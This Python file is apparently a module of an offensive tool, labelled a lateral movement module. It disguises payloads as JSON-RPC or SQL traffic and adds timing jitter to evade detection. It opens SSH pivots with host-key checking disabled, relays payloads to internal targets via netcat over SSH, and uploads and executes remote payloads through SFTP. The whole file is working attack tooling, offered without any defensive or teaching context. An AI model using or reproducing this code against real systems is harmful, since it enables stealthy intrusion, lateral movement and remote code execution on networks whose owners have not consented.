import random
import time
import socket
import requests
import paramiko
from rich.console import Console

console = Console()

class TrafficBlender:
    @staticmethod
    def blend_traffic(payload: str, protocol: str = "HTTP") -> str:
        if protocol == "HTTP":
            return f'{{"jsonrpc": "2.0", "method": "query", "params": {{ "id": "{payload}" }}, "id": 1}}'
        elif protocol == "SQL":
            return f"SELECT * FROM logs WHERE message = '{payload}'"
        return payload

    @staticmethod
    def apply_jitter(base_delay: float = 0.1):
        jitter = random.uniform(0, base_delay * 2)
        time.sleep(base_delay + jitter)

class PivotTunnel:
    """
    Lateral Movement Module.
    Uses REAL networking (Sockets, SSH) to route attacks.
    UPGRADED: File Transfer Capability.
    """
    def __init__(self):
        self.pivots = []
        self.blender = TrafficBlender()
        self.ssh_client = None

    def add_ssh_pivot(self, host: str, user: str, key_path: str = None, password: str = None):
        console.print(f"[PIVOT] 🌉 Establishing SSH Tunnel to {host}...")
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(host, username=user, password=password, key_filename=key_path, timeout=2)
            self.pivots.append({"type": "SSH", "host": host, "client": self.ssh_client})
            console.print(f"[PIVOT] ✅ SSH Tunnel Established.")
        except Exception as e:
            console.print(f"[PIVOT] ❌ SSH Connection Failed: {e}")
            self.ssh_client = None # Ensure it's None if failed

    def execute_remote(self, target_ip: str, target_port: int, payload: str, stealth: bool = True) -> str:
        if stealth: self.blender.apply_jitter()
        final_payload = self.blender.blend_traffic(payload) if stealth else payload

        if self.ssh_client:
            cmd = f"echo '{final_payload}' | nc -w 3 {target_ip} {target_port}"
            console.print(f"[PIVOT] 🔀 Routing via SSH: {cmd}")
            try:
                stdin, stdout, stderr = self.ssh_client.exec_command(cmd)
                response = stdout.read().decode().strip()
                err = stderr.read().decode().strip()
                return response if response else (err if err else "NO_RESPONSE")
            except Exception as e:
                return f"SSH_EXEC_ERROR: {e}"
        else:
            console.print(f"[PIVOT] ➡️ Direct Connect: {target_ip}:{target_port}")
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target_ip, target_port))
                s.sendall(final_payload.encode())
                response = s.recv(4096).decode()
                s.close()
                return response
            except Exception as e:
                return f"SOCKET_ERROR: {e}"

    def upload_and_exec(self, local_path: str, remote_path: str) -> str:
        """
        Uploads a file via SFTP and executes it on the remote host.
        """
        if not self.ssh_client:
            return "ERROR: No SSH Session"

        try:
            sftp = self.ssh_client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            console.print(f"[PIVOT] ✅ File Uploaded: {remote_path}")

            # Execute
            cmd = f"python3 {remote_path}"
            console.print(f"[PIVOT] 🚀 Executing Remote Payload: {cmd}")
            stdin, stdout, stderr = self.ssh_client.exec_command(cmd)

            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()

            if output: console.print(f"[REMOTE OUTPUT]\n{output}")
            if error: console.print(f"[REMOTE ERROR]\n{error}")

            return output
        except Exception as e:
            console.print(f"[PIVOT] ❌ Upload/Exec Failed: {e}")
            return str(e)
